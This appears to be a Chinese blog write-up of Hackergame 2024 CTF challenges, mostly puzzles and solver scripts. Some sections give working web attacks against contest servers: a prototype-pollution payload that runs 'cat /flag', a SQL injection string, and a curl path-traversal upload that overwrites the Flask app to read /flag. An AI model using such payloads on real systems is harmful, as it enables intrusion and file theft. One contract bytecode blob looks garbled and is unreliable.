---
title: 2024 Hackergame WP
date: 2024-11-09 14:24:50
updated: 2024-11-09 14:24:50
tags: [CTF,Hackergame]
categories: [笔记]
thumbnail: /images/ctf/hackergame2024/1.webp
cover: /images/ctf/hackergame2024/1.webp
toc: true
---

总结一下参与[2024 Hackergame](https://hack.lug.ustc.edu.cn/)的一些题目的WriteUp。
<!-- more -->

## 签到 50

链接后加 /?pass=true 即可得到flag。

## 喜欢做签到的 CTFer 你们好呀

点击主页承办单位的链接，进入终端后执行命令即可找到。

![命令行](/images/ctf/hackergame2024/image.webp)

![命令行](/images/ctf/hackergame2024/image-1.webp)

## 猫咪问答

1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？（30 分）
提示：填写教室编号，如 5207、3A101。

答案：3A204

2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？（30 分）
提示：是一个非负整数。

答案: 2682

3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？（20 分）
提示：仅由中文汉字构成。

答案：程序员的自我修养

4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？（10 分）
提示：是一个非负整数。

答案：336

5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？（5 分）
提示：id 前 6 位，字母小写，如 c1e939。

答案：6e90b6

6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？（5 分）
提示：首次打开本页时的 HTML 源代码，答案是一个非负整数

答案：1833

```
from transformers import AutoTokenizer
tokenizer = AutoTokenizer.from_pretrained("NousResearch/Meta-Llama-3-70B")
with open("1.html", "r", encoding="utf-8") as file:
    html_content = file.read()
tokens = tokenizer.encode(html_content)
print(f"Token 数量: {len(tokens)}")
```

![Token 数量](/images/ctf/hackergame2024/image-3.webp)

## 打不开的盒

3D 查看器直接看。

![3D查看](/images/ctf/hackergame2024/image-4.webp)

## 每日论文太多了！

PDF 编辑移去遮挡即可获得。

![论文](/images/ctf/hackergame2024/image-5.webp)

## 比大小王

通过抓取流量分析得提交答案的 cookie 值正好是链接时返回的值，因此写脚本获取赛题内容，计算后提交即可。

```python
import json
import requests
import time

url_get = "http://202.38.93.141:12122/game"
headers = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Content-Length": "2",
    "Content-Type": "application/json",
    "Cookie": "session=",
    "Host": "202.38.93.141:12122",
    "Origin": "http://202.38.93.141:12122",
    "Proxy-Connection": "keep-alive",
    "Referer": "http://202.38.93.141:12122/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
}
response = requests.post(url_get, headers=headers, json={})
print(response.text)
data = response.json()

new_cookie = response.headers.get('Set-Cookie')
if new_cookie:
    headers['Cookie'] = new_cookie

result = {"inputs": []}

for pair in data["values"]:
    if pair[0] > pair[1]:
        result["inputs"].append(">")
    else:
        result["inputs"].append("<")
time.sleep(8) #等待比赛开始
url_submit = "http://202.38.93.141:12122/submit"
response = requests.post(url_submit, headers=headers, json=result)

print(response.text)
```

## 旅行照片 4.0

问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：X校区Y门，均为一个汉字）

东校区西门

问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：YYYYMMDD）

20240519

问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）

中央公园

问题 4: 这个景观所在的景点的名字是？（三个汉字）

坛子岭

问题 5: 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX医院）

积水潭医院

问题 6: 左下角的动车组型号是？

CRH6F-A

铁路迷狂喜。

## 不宽的宽字符

utf-8 转 unicode

Z:\theflag -> 㩚瑜敨汦条.

## PowerfulShell

```bash
PowerfulShell@hackergame> ${-:1}
/players/PowerfulShell.sh: line 16: B: command not found
PowerfulShell@hackergame> ${-:1}
/players/PowerfulShell.sh: line 16: B: command not found
PowerfulShell@hackergame> ${-:--1}
/players/PowerfulShell.sh: line 16: hB: command not found
PowerfulShell@hackergame> ${-:-1}
/players/PowerfulShell.sh: line 16: hB: command not found
PowerfulShell@hackergame> __=~
PowerfulShell@hackergame> __=$__$-
PowerfulShell@hackergame> ${__:7:2}

s
sh: 2: s: not found
cat /flag
```
![PowerfulShell](/images/ctf/hackergame2024/image-9.webp)

## Node.js is Web Scale

注入

```json
{
  "key": "__proto__.newCmd",
  "value": "cat /flag"
}
```

访问 url+/execute?cmd=newCmd。在 POST /set 接口中，用户提供的键值对被直接写入到store对象中。当用户提供的键包含 __proto__时，例如__proto__.newCmd，代码会将该键值对挂载到 Object.prototype 上。这会导致所有对象都继承了 newCmd 属性，造成原型污染。

在 GET /execute 接口中，代码从 cmds 对象中获取命令：const cmd = cmds[key]; 。如果key不在cmds自身属性中，JavaScript 会沿原型链查找。由于 cmds 的原型链被污染，cmds[key] 可能获取到攻击者注入的命令。执行 execSync(cmd) 时，就会运行任意命令。

![原型污染](/images/ctf/hackergame2024/image-8.webp)

## PaoluGPT

### 千里挑一

油猴脚本检测flag。

```js
(function() {
    'use strict';

    window.addEventListener('load', function() {
        var links = document.querySelectorAll('a[href^="/view?conversation_id="]');
        links.forEach(function(link, index) {
            fetch(link.href)
                .then(response => response.text())
                .then(data => {
                    if (data.includes('flag')) {
                        console.log(`Link ${index + 1} contains flag: ${link.href}`);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        });
    }, false);
})();
```

### 窥视未知

分析服务器代码发现其并没有对传入的 conversation_id 进行过滤，因此使用其获得不可见的页面。

url后缀添加 /view?conversation_id=1' OR shown = false-- 查询即可。


## 强大的正则表达式

### Easy

这题应该是 dfa 转正则，没搞明白，最后写了个又臭又长的匹配过了第一问。

```shell
1
(0|1|2|3|4|5|6|7|8|9)*(0000|0016|0032...9984)
```

## 惜字如金 3.0

### A

交给 gpt 操作即可。

### B

分析题目代码，一个 crc 校验 + 一个哈希，通过 z3 求解。

```python
from z3 import *

tests = '3'
testhash = '052475a6ea91'
target_digest = int(testhash, 16)
poly = BitVec('poly', 48)
flip = BitVec('flip', 48)
digestcrc = BitVec('digestcrc', 48)
poly_degree = 48

u2 = 241818181881667
u1 = 279270832074457
u0 = 202208575380941
modulo = 1 << 48

s = Solver()
digest = BitVec('digest', 48)
known_digest = int.from_bytes(bytes.fromhex(testhash), 'little')
s.add(known_digest == (digest * (digest * u2 + u1) + u0) % modulo)

digestinit = BitVecVal((1 << 48) - 1, 48)
tmp = [BitVec(f'tmp_{i}', 48) for i in range(9)]
s.add(tmp[0] == digestinit)
for b in bytes(tests, 'utf-8'):
    tmp[0] = tmp[0] ^ b
    for _ in range(1,9):
        s.add(tmp[_] == LShR(tmp[_-1], 1) ^ (flip * (tmp[_-1] & 1)))
s.add(tmp[-1] == digest  ^ (1 << 48) - 1)

if s.check() == sat:
    m = s.model()
    print(f"flip = {m[flip].as_long()}")
    ## transform flip to binary
    flip = m[flip].as_long()
    flip = bin(flip)[2:].zfill(48)[::-1]
    print(f"flip = {flip}")
    strings = ''
    for j in str(flip):
        if j == '0':
            strings += 'b'
        else:
            strings += 'B'
    print(f"poly = {strings}")
```

求出后替换程序中的 poly ，提交即可。

### C

通过分析代码，发现需要用到自定义 crc 校验值算法来求解，使其经过系列转换后输入能被解析成 ‘answer_c’ 。借用了一个模板实现，然后根据匹配的 hex 值来逐步爆破。

![爆破](/images/ctf/hackergame2024/image-11.webp)


```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#define CRC32_POLY 0xf9fdd219bc58

uint64_t crc32_table[256];
uint64_t crc32_reverse[256];

void init_custom_crc32()
{
    if (crc32_table[1])
        return;
    uint64_t i, j;
    for (i = 0; i < 256; i++)
    {
        uint64_t crc = i;
        uint64_t rev = i << 40;
        for (j = 0; j < 8; j++)
        {
            if (crc & 1)
                crc = (crc >> 1) ^ CRC32_POLY;
            else
                crc = crc >> 1;
            crc &= 0xffffffffffff;

            if (rev & 0x800000000000)
                rev = ((rev ^ CRC32_POLY) << 1) | 1;
            else
                rev = rev << 1;
            rev &= 0xffffffffffff;
        }
        crc32_table[i] = crc;
        crc32_reverse[i] = rev;
    }
}

uint64_t custom_crc32(uint64_t crc32, const void *front, uint64_t front_length, const void *behind, uint64_t behind_length)
{
    int i = 0;
    const uint8_t *front_ptr = (const uint8_t *)front;
    const uint8_t *behind_ptr = (const uint8_t *)behind;
    init_custom_crc32();

    uint64_t front_crc32 = 0xffffffffffff;
    for (i = 0; i < front_length; i++)
    {
        front_crc32 = (front_crc32 >> 8) ^ crc32_table[front_crc32 & 0xFF ^ front_ptr[i]];
        front_crc32 &= 0xffffffffffff;
    }

    uint64_t behind_crc32 = crc32 ^ 0xffffffffffff;
    for (i = 0; i < behind_length; i++)
    {
        behind_crc32 = (behind_crc32 << 8) ^ crc32_reverse[behind_crc32 >> 40];
        behind_crc32 &= 0xffffffffffff;
        behind_crc32 = behind_crc32 ^ behind_ptr[behind_length - 1 - i];
        behind_crc32 &= 0xffffffffffff;
    }
    for (i = 0; i < 6; i++)
    {
        const uint8_t *crc = (const uint8_t *)&front_crc32;
        behind_crc32 = (behind_crc32 << 8) ^ crc32_reverse[behind_crc32 >> 40];
        behind_crc32 &= 0xffffffffffff;
        behind_crc32 = behind_crc32 ^ crc[6 - 1 - i];
        behind_crc32 &= 0xffffffffffff;
    }
    return behind_crc32;
}

int caculate(char *strs)
{
    /*
    int count = 0
    for (int i = 0; i < 100; i++)
    {
        if (strs[i] == '1')
        {
            count++;
        }
    }
    */
    // printf("%012llX", custom_crc32(0x4402c8f3cfaa, "0", 0, "11", 1));
    uint64_t result = custom_crc32(0x4402c8f3cfaa, "", 0, strs, 58);
    // change to string
    char str[13];
    str[12] = '\0';
    for (int i = 0; i < 14; i++)
    {
        str[11 - i] = "0123456789ABCDEF"[result & 0xF];
        result >>= 4;
    }
    for (int i = 5; i > -1; i--)
    {
        printf("%c%c", str[i * 2], str[i * 2 + 1]);
    }

    for (int i = 0; i < 58; i++)
    {
        {
            printf("%02X", strs[i]);
        }
    }
    /*
    for (int i = 0; i < 100; i++)
    {
        if (strs[i] == '1')
        {
            printf("31");
        }
    }
    */
    printf("0A\n");

}

int main()
{ /*
     for (int i = 58; i < 59; i++)
     //for (int i = 0; i < 100; i++) 确定长度为 58 （64）
     {
         // strs是不同长度的1组成的字符串,最高100位

         char strs[100] = {0};
         for (int j = 0; j < i; j++)
         {
             strs[j] = '1';
         }

         }*/
    //char strlst[91] = "!#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~";
    //char strlst 改成 180-270 hex
    char strlst[91] = {0xb4, 0x8b, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2};
    char strs[58] = {0};
/*
    for (int dis = 0; dis < 96; dis++)
    {
        for (int i = 0; i < 58; i++)
        {
            if (i + dis < 91)
                strs[i] = strlst[i + dis];
            else
                strs[i] = strlst[i + dis - 91];
        }*/
        //printf("%s\n", strs);
        strs[57] = '6';
        strs[56] = 'c';
        strs[55] = '3';
        strs[54] = 'b';
        strs[53] = 0x64;
        strs[52] = 0x4f;
        //715F63364763382323627542593F5770585734617872434F456D535A714D7C45582462316737235769327066456D55595F456D414F64623363360A
        strs[1] = 0x5F;
        strs[0] = 0x71;
        caculate(strs);
        
    
    printf(" \n\n");
    printf(" \n\n");
    printf(" \n\n");
    return 0;
}
```

```py
import base64
flag = b'flag{'
for i in range(180):
    strings = chr(i)
    flagc = flag + strings.encode()
    print(base64.b85encode(flagc))

hexstr = '715F63364763382323627542593F5770585734617872434F456D535A714D7C45582462316737235769327066456D55595F456D414F64623363360A'
## hex to bytes
byte = bytes.fromhex(hexstr)
byte = b'W^7?+d' + byte[:-1]
print(byte)
print(base64.b85decode(byte))
```

最后需要在 `flag{` 后面爆破一位，使其匹配上 `_`，最终解码得到答案。



## 优雅的不等式 400

### easy

Please prove that pi>=2
Enter the function f(x): 4*((1-x**2)**(1/2)-(1-x))
Q.E.D.
Please prove that pi>=8/3
Enter the function f(x): (x-x**2)**4*(299+300*x**2)/(1+x**2)
Q.E.D.

### hard

构造一种接近 pi 的数的算法，然后指定 n 值（确定要计算到小数点后多少位，30大概就能计算到题目要求的范围），通过 sympy 求解。

```py
import socket
import re
import math
import sympy
import time
x = sympy.Symbol('x')

def main(p, q, n):
    f = '((x-x**2)**(4*{})*(a+b*x**2)-(-4)**{}*(a-b))/(1+x**2)'.format(n, n)
    f = sympy.parsing.sympy_parser.parse_expr(f)
    integrate_result = sympy.integrate(f, (x, 0, 1))
    #print(integrate_result)
    a1 = re.search(r"(\d+)\*a", str(integrate_result)).group(1)
    a2 = re.search(r"(\d+)\*a/(\d+)", str(integrate_result)).group(2)
    b1 = re.search(r"(\d+)\*b", str(integrate_result)).group(1)
    b2 = re.search(r"(\d+)\*b/(\d+)", str(integrate_result)).group(2)
    a1, a2, b1, b2 = int(a1), int(a2), int(b1), int(b2)
    buf1 = p*4**(n-1)
    bufa1 = q*a1
    bufb1 = q*b1
    buf2 = abs(buf1*a2 - bufa1)
    buf3 = abs(buf1*b2 - bufb1)
    buf2 = buf2*b2
    buf3 = buf3*a2
    a = buf3//math.gcd(buf2, buf3)
    b = buf2//math.gcd(buf2, buf3)

    f = "(x-x**2)**{}*({}+{}*x**2)/((1+x**2))".format(n*4, a, b)
    f = sympy.parsing.sympy_parser.parse_expr(f)
    integrate_result = sympy.integrate(f, (x, 0, 1))
    #print(integrate_result)

    integrate_result = str(integrate_result)
    pi = re.search(r"(\d+/\d+|\d+)(\*pi)", integrate_result).group(1)
    #print(pi)
    q = pi

    print("(x-x**2)**{}*({}+{}*x**2)/({}*(1+x**2))".format(n*4, a, b, q))
    return "(x-x**2)**{}*({}+{}*x**2)/({}*(1+x**2))".format(n*4, a, b, q)
    f = "(x-x**2)**{}*({}+{}*x**2)/({}*(1+x**2))".format(n*4, a, b, q)
    f = sympy.parsing.sympy_parser.parse_expr(f)
    integrate_result = sympy.integrate(f, (x, 0, 1))
    #print(integrate_result)

def get_pq(p, q):
    #pis = '3.141592653589793238462643383279502884197169399375105820974944592307816406286208998628034825342117067982148086513282306647093844609550582231725359408128'
    #strpq = p/q
    #strpq = str(strpq)
    #n = 0
    #for i in range(2, len(strpq)):
    ##    if strpq[i] == pis[i]:
    ##        n += 1
    ##    else:
    ##        break
    n = 30
    ans = main(p, q, n)
    return ans


def connect_to_server(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        data = s.recv(1024)
        print("Received:", data.decode())
        s.sendall(b'<token>\n')
        data = s.recv(1024)
        s.sendall(b'4*((1-x**2)**(1/2)-(1-x))\n')
        data = s.recv(1024)
        s.sendall(b'(x-x**2)**4*(299+300*x**2)/(1+x**2)\n')
        data = s.recv(1024)
        time.sleep(1)
        print("Received:", data.decode())
        while True:
            ## 接收数据
            data = s.recv(1024)
            match = re.search(r'pi>=(\d+)/(\d+)', data.decode())
            if match:
                p = int(match.group(1))
                q = int(match.group(2))
            print("Received:", data.decode())
            print(f"Matched p: {p}, q: {q}")
            ans = get_pq(p, q)
            print("Sending:", ans)
            s.sendall(ans.encode() + b'\n')
            time.sleep(2)
        s.close()
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    ip = "202.38.93.141"
    port = 14514
    connect_to_server(ip, port)
```

## ZFS 文件恢复

### Text File

binwalk 提取文件，发现第二个 zlib 文件中有两个 789c 开头，将第二个 789c 开头的部分提取出来，zlib 解压得到答案。

![Text File](/images/ctf/hackergame2024/image-17.webp)

## 链上转账助手

### 转账失败

### 转账又失败

问就是这么输入就对了。

```shell
Player bytecode: 608060405234801561001057600080fd5b50604051602080610123833981018060405281019080805182019291906020018051820192919050505080600081905550506100d58061004a6000396000f3fe6080604052600436106100295760003560e01c806360fe47b11461002e5780636d4ce63c1461004c575b600080fd5b610036610064565b60405161004391906100a2565b60405180910390f35b61005461006a565b005b60005481565b60008054905090565b6000819050919050565b61008a81610077565b82525050565b60006020820190506100a56000830184610081565b92915050565b600081905091905056fea2646970667358221220b7e5e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8
```

## 不太分布式的软总线

分析代码，这题要求我们通过 dbus 调用服务获取 flag。

### What DBus Gonna Do?

```shell
#!/bin/bash

## 调用GetFlag1方法并传递正确的参数
result=$(gdbus call --system --dest cn.edu.ustc.lug.hack.FlagService --object-path /cn/edu/ustc/lug/hack/FlagService --method cn.edu.ustc.lug.hack.FlagService.GetFlag1 "Please give me flag1")

## 提取返回的flag1值
flag1=$(echo $result | awk -F"'" '{print $2}')

## 输出flag1
echo "Flag1: $flag1"
```

### If I Could Be A File Descriptor

```c
#include <gio/gio.h>
#include <gio/gunixfdlist.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

int main()
{
    GError *error = NULL;
    GDBusConnection *connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (error)
    {
        g_printerr("连接到D-Bus失败：%s\n", error->message);
        return 1;
    }

    int pipefd[2];
    if (pipe(pipefd) == -1)
    {
        perror("创建管道失败");
        return 1;
    }

    const char *msg = "Please give me flag2\n";
    write(pipefd[1], msg, strlen(msg));
    close(pipefd[1]);

    GUnixFDList *fd_list = g_unix_fd_list_new();
    g_unix_fd_list_append(fd_list, pipefd[0], &error);
    if (error)
    {
        g_printerr("创建GUnixFDList失败：%s\n", error->message);
        return 1;
    }

    GVariant *params = g_variant_new("(h)", 0);

    GVariant *result = g_dbus_connection_call_with_unix_fd_list_sync(
        connection,
        "cn.edu.ustc.lug.hack.FlagService",
        "/cn/edu/ustc/lug/hack/FlagService",
        "cn.edu.ustc.lug.hack.FlagService",
        "GetFlag2",
        params,
        G_VARIANT_TYPE("(s)"),
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        fd_list,
        NULL,
        NULL,
        &error);

    if (error)
    {
        g_printerr("调用GetFlag2失败：%s\n", error->message);
        return 1;
    }

    const char *flag2;
    g_variant_get(result, "(&s)", &flag2);
    printf("flag2: %s\n", flag2);

    g_object_unref(fd_list);
    g_object_unref(connection);
    g_variant_unref(result);

    return 0;
}

gcc get_flag2.c $(pkg-config --cflags --libs gio-unix-2.0 gio-2.0) -o get_flag2
```
### Comm Say Maybe

```c
#define _GNU_SOURCE
#include <gio/gio.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/prctl.h>  // 添加此行以包含 prctl 函数的声明

int main(int argc, char **argv) {
    prctl(PR_SET_NAME, "getflag3");
    argv[0] = "getflag3";

    GError *error = NULL;
    GDBusConnection *connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (error) {
        g_printerr("连接到D-Bus失败：%s\n", error->message);
        return 1;
    }

    GVariant *result = g_dbus_connection_call_sync(
        connection,
        "cn.edu.ustc.lug.hack.FlagService",
        "/cn/edu/ustc/lug/hack/FlagService",
        "cn.edu.ustc.lug.hack.FlagService",
        "GetFlag3",
        NULL,
        G_VARIANT_TYPE("(s)"),
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        NULL,
        &error
    );

    if (error) {
        g_printerr("调用GetFlag3失败：%s\n", error->message);
        return 1;
    }

    const char *flag3;
    g_variant_get(result, "(&s)", &flag3);
    printf("flag3: %s\n", flag3);
    return 0;
}

gcc get_flag3.c $(pkg-config --cflags --libs gio-unix-2.0 gio-2.0) -o get_flag3
```

##  关灯 300

z3 一把梭。

### Easy
### Medium
### Hard
```py
from z3 import *
import numpy as np

def convert_switch_array_to_lights_constraints(switch_array: list, n: int) -> list:
    lights_constraints = []
    for i in range(n):
        for j in range(n):
            for k in range(n):
                neighbors = [switch_array[i][j][k]]
                if i > 0:
                    neighbors.append(switch_array[i-1][j][k])
                if i < n-1:
                    neighbors.append(switch_array[i+1][j][k])
                if j > 0:
                    neighbors.append(switch_array[i][j-1][k])
                if j < n-1:
                    neighbors.append(switch_array[i][j+1][k])
                if k > 0:
                    neighbors.append(switch_array[i][j][k-1])
                if k < n-1:
                    neighbors.append(switch_array[i][j][k+1])
                
                expr = neighbors[0]
                for neighbor in neighbors[1:]:
                    expr = Xor(expr, neighbor)
                lights_constraints.append(expr)
    return lights_constraints

def solve_puzzle(lights_input: str, n: int) -> str:
    if len(lights_input) != n**3 or not all(c in '01' for c in lights_input):
        raise ValueError(f"输入必须是长度为{n**3}的0和1组成的字符串")
    
    given_lights = np.array(list(map(int, lights_input))).reshape(n, n, n)
    
    switch = [[[Bool(f'switch_{i}_{j}_{k}') for k in range(n)] for j in range(n)] for i in range(n)]
    
    s = Solver()
    
    lights_constraints = convert_switch_array_to_lights_constraints(switch, n)
    
    for idx in range(n**3):
        light = given_lights.flatten()[idx]
        if light:
            s.add(lights_constraints[idx] == True)
        else:
            s.add(lights_constraints[idx] == False)
    
    if s.check() == sat:
        m = s.model()
        switch_result = ''.join(['1' if is_true(m.evaluate(switch[i][j][k])) else '0' 
                                 for i in range(n) for j in range(n) for k in range(n)])
        return switch_result
    else:
        return "未找到解。"

def main():
    n = 11  # 指定难度
    lights_input = input(f"请输入灯光状态的0-1字符串（长度为{n**3}） ---").strip()
    try:
        solution = solve_puzzle(lights_input, n)
        print(f"开关状态的解决方案：{solution}")
    except ValueError as ve:
        print(f"输入错误: {ve}")

if __name__ == "__main__":
    main()
```

## 禁止内卷

题目提示了文件路径，使用路径遍历漏洞覆盖正在运行的flask文件，会被热重载。

```shell
 curl -F "file=@app.py;filename=../web/app.py" https://chal02-fkdl7zuy.hack-challenge.lug.ustc.edu.cn:8443/submit
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

```python
from flask import Flask, render_template, request, flash, redirect
import json
import os
import traceback
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(64)

UPLOAD_DIR = "/tmp/uploads"

os.makedirs(UPLOAD_DIR, exist_ok=True)

# results is a list
try:
    with open("results.json") as f:
        results = json.load(f)
except FileNotFoundError:
    results = []
    with open("results.json", "w") as f:
        json.dump(results, f)


def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        # sanitize answer
        for idx, i in enumerate(answers):
            if i < 0:
                answers[idx] = 0
    return answers


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html", results=sorted(results))


@app.route("/submit", methods=["POST"])
def submit():
    if "file" not in request.files or request.files["file"].filename == "":
        flash("你忘了上传文件")
        return redirect("/")
    file = request.files["file"]
    filename = file.filename
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)

    answers = get_answer()
    try:
        with open(filepath) as f:
            user = json.load(f)
    except json.decoder.JSONDecodeError:
        flash("你提交的好像不是 JSON")
        return redirect("/")
    try:
        score = 0
        for idx, i in enumerate(answers):
            score += (i - user[idx]) * (i - user[idx])
    except:
        flash("分数计算出现错误")
        traceback.print_exc()
        return redirect("/")
    # ok, update results
    results.append(score)
    with open("/flag") as f:
        answers = f.read()
    flash(f"答案为 {answers}")
    return redirect("/")

```

## 哈希三碰撞

### 三碰撞之一

IDA 分析第一个 elf，发现监测数据是在输入从十六进制转为二进制之后，因此可以构造大小写不同但是数据相同的十六进制字符串，即可求解。

```shell
Which challenge (1 or 2): 1
Data 1:0A0B0C0D0E0F1011
Data 2:0a0b0c0d0e0f1011
Data 3:0A0b0C0D0E0F1011
```


## 零知识数独

### 数独高手 100

写一个程序解数独就行了。

![数独1](/images/ctf/hackergame2024/image-6.webp)

```
def is_valid(board, row, col, num):
    for i in range(9):
        if board[row][i] == num or board[i][col] == num:
            return False
    start_row, start_col = 3 * (row // 3), 3 * (col // 3)
    for i in range(3):
        for j in range(3):
            if board[start_row + i][start_col + j] == num:
                return False
    return True

def solve_sudoku(board):
    for row in range(9):
        for col in range(9):
            if board[row][col] == 0:
                for num in range(1, 10):
                    if is_valid(board, row, col, num):
                        board[row][col] = num
                        if solve_sudoku(board):
                            return True
                        board[row][col] = 0
                return False
    return True

def print_board(board):
    for row in board:
        print(" ".join(str(num) for num in row))

## 从标准输入读取数独谜题
board = []
for _ in range(9):
    line = input().strip()
    board.append([int(num) for num in line])

if solve_sudoku(board):
    print_board(board)
else:
    print("无法解决这个数独谜题")
```


###  ZK 高手 150

搜了一下发现是零知识证明，需要在本地配置好环境后，构造input.json（问题和答案），然后进行证明。

```json
{
    "unsolved_grid": [
      [5, 0, 0, 0, 0, 6, 0, 4, 0],
      [2, 6, 4, 0, 0, 0, 0, 0, 8],
      [0, 0, 0, 0, 0, 1, 0, 0, 0],
      [0, 1, 0, 0, 0, 0, 0, 0, 0],
      [0, 0, 0, 3, 0, 8, 1, 0, 0],
      [9, 0, 0, 0, 7, 0, 0, 3, 0],
      [0, 0, 0, 0, 8, 0, 7, 0, 2],
      [0, 0, 7, 0, 6, 0, 0, 0, 0],
      [0, 0, 3, 2, 0, 0, 0, 0, 4]
    ],
    "solved_grid": [
      [5, 3, 1, 8, 9, 6, 2, 4, 7],
      [2, 6, 4, 7, 3, 5, 9, 1, 8],
      [7, 8, 9, 4, 2, 1, 6, 5, 3],
      [3, 1, 2, 6, 4, 9, 8, 7, 5],
      [4, 7, 6, 3, 5, 8, 1, 2, 9],
      [9, 5, 8, 1, 7, 2, 4, 3, 6],
      [1, 4, 5, 9, 8, 3, 7, 6, 2],
      [8, 2, 7, 5, 6, 4, 3, 9, 1],
      [6, 9, 3, 2, 1, 7, 5, 8, 4]
    ]
  }
```
```bash
snarkjs wtns calculate sudoku.wasm input.json witness.wtns
snarkjs wtns export json witness.wtns public.json
snarkjs groth16 prove sudoku.zkey witness.wtns proof.json public.json
snarkjs groth16 verify verification_key.json public.json proof.json
```
![数独2](/images/ctf/hackergame2024/image-10.webp)

##  神秘代码2

base64解第一行，结果末尾的字母表换表解第二行。

![base64](/images/ctf/hackergame2024/image-15.webp)

![换表](/images/ctf/hackergame2024/image-14.webp)

